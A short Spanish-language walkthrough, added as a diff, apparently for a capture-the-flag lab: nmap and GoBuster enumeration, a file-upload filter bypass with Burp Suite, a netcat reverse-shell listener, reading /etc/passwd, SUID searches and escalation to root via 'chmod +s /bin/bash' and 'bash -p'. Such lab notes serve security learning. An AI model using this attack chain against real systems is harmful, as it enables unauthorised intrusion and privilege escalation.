@@ -1,0 +1,25 @@
+1_Escaneo nmap con -sV
+
+2_Encontrar directorio escondido con GoBuster y diccionario
+/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+3_Activar burpsuite para subir el archivo
+4_Buscar tipo de archivos permitidos, sustituyendo extension
+y utilizando wordlist 
+5_Subir archivo infectado
+
+5_Buscar (de nuevo con GoBuster) subdirectorio escondido 
+dentro del directorio /internal
+
+6_Ponernos a la escucha en el puerto 443 con el comando
+"nc -lvnp 443" y ejecutar archivo malicioso
+
+7_Una vez dentro, ejecutar "python -c 'import pty; pty.spawn("/bin/bash")'"
+para poder ejecutar comandos y mucho mas
+
+8_Buscamos usuarios en "cat /etc/passwd" donde cualquier
+linea con el primer numero superior a 999 es un usuario
+
+9_Buscamos archivos con privilegios SUID con "find / -perm -4000 2>/dev/null"
+10_Buscamos exploit en internet que nos permita ejecutar "chmod +s /bin/bash"
+11_Nos hacemos admins con "bash -p"
